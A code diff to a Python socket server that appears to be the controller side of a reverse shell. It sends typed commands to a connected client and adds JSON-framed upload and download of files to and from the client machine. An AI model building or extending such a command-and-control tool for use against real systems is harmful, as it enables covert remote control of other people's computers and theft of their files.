@@ -2,6 +2,7 @@ import socket
 from colorama import Fore, Style, init
 import json
 import base64
+import os
 
 # Initialize colorama
 init(autoreset=True)
@@ -22,6 +23,19 @@ server.listen(5)
 print(Fore.YELLOW + f"Server listening on {Fore.CYAN}{HOST}:{PORT}")
 client_socket, client_address = server.accept()
 print(Fore.GREEN + f"Connection established with {client_address}")
+
+def send_json(conn, data):
+    json_data = json.dumps(data)
+    conn.send(json_data.encode())
+
+def receive_json(conn):
+    json_data = ""
+    while True:
+        try:
+            json_data = json_data + conn.recv(1024).decode()
+            return json.loads(json_data)
+        except ValueError:
+            continue
 
 def write_file(path, content):
     with open(path, "wb") as file:
@@ -49,17 +63,20 @@ try:
             client_socket.close()
             break
 
-        elif command.startswith("download"):
-            _, path = command.split(" ", 1)
-            response = client_socket.recv(4096).decode("utf-8")
-            print(write_file(path, response))
-            continue
-
-        elif command.startswith("upload"):
-            _, path = command.split(" ", 1)
+        # Handle upload and download commands
+        if command.startswith("upload"):
+            path = command.split(" ")[1]
             file_content = read_file(path)
-            client_socket.sendall(file_content.encode("utf-8"))
-            print(client_socket.recv(4096).decode("utf-8"))
+            send_json(client_socket, ["upload", path, file_content])
+            response = receive_json(client_socket)
+            print(Fore.WHITE + response)
+            continue
+        elif command.startswith("download"):
+            path = command.split(" ")[1]
+            send_json(client_socket, ["download", path])
+            file_content = receive_json(client_socket)
+            response = write_file(path, file_content)
+            print(Fore.WHITE + response)
             continue
 
         # Receive the output from the client
